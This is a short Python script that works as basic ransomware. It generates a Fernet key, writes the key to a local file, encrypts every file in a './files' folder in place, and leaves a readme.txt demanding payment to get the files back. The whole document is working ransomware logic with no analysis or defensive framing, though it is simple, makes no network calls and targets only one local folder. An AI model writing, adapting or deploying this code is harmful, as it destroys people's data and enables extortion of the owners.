from cryptography.fernet import Fernet
import os

def generate_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

def add_key():
    return open('key.key', 'rb').read()

def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

if __name__ == '__main__':

    path_to_encrypt = "./files"
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'/'+item for item in items]

    generate_key()
    key = add_key()

    encrypt(full_path, key)

    with open(path_to_encrypt+'/'+'readme.txt', 'w') as file:
        file.write('Your files are encrypted\n')
        file.write('Please pay to get them back. Thanks')